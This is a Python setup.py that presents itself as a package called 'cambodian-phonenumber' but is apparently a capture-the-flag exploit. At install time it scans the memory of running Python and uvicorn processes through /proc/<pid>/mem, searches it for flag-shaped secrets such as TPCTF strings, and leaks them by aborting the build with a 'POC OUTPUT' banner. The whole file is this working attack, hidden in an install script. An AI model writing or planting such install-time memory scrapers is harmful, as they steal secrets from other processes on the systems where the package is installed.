import os, re, glob
from setuptools import setup

FLAG_RE = re.compile(rb'[A-Za-z0-9_!?-]{2,40}\{[^{}]{3,200}\}')

def cmdline(pid):
    try:
        with open(f"/proc/{pid}/cmdline","rb") as f:
            return f.read().replace(b'\0',b' ').decode('utf-8','replace')
    except: return ""

def scan(pid):
    hits=set()
    try:
        regions=[]
        with open(f"/proc/{pid}/maps") as m:
            for line in m:
                p=line.split()
                addrs,perms=p[0],p[1]
                if 'r' not in perms: continue
                name=p[5] if len(p)>=6 else ''
                # anon + heap only (where Python str objects live)
                if name not in ('','[heap]'): continue
                lo,hi=[int(x,16) for x in addrs.split('-')]
                if hi-lo > 300*1024*1024: continue
                regions.append((lo,hi))
        with open(f"/proc/{pid}/mem","rb") as mem:
            for lo,hi in regions:
                try:
                    mem.seek(lo); data=mem.read(hi-lo)
                except: continue
                for mo in FLAG_RE.finditer(data):
                    hits.add(mo.group())
    except Exception as e:
        pass
    return hits

pids=[d for d in os.listdir('/proc') if d.isdigit()]
allhits=set()
targets=[]
for pid in pids:
    cl=cmdline(pid)
    if 'python' in cl or 'uvicorn' in cl:
        targets.append((pid,cl))
        allhits |= scan(pid)

# prioritize flag-looking strings
pref=[h for h in allhits if b'lag' in h.lower() or b'ctf' in h.lower() or b'TPCTF' in h]
out=[]
out.append("targets="+str([t[0] for t in targets]))
out.append("FLAGHITS:")
for h in (pref if pref else list(allhits)[:60]):
    try: out.append("  "+h.decode('utf-8','replace'))
    except: pass
banner="\n".join("POC>> "+l for l in out)
raise SystemExit("\n\n==== POC OUTPUT START ====\n"+banner+"\n==== POC OUTPUT END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
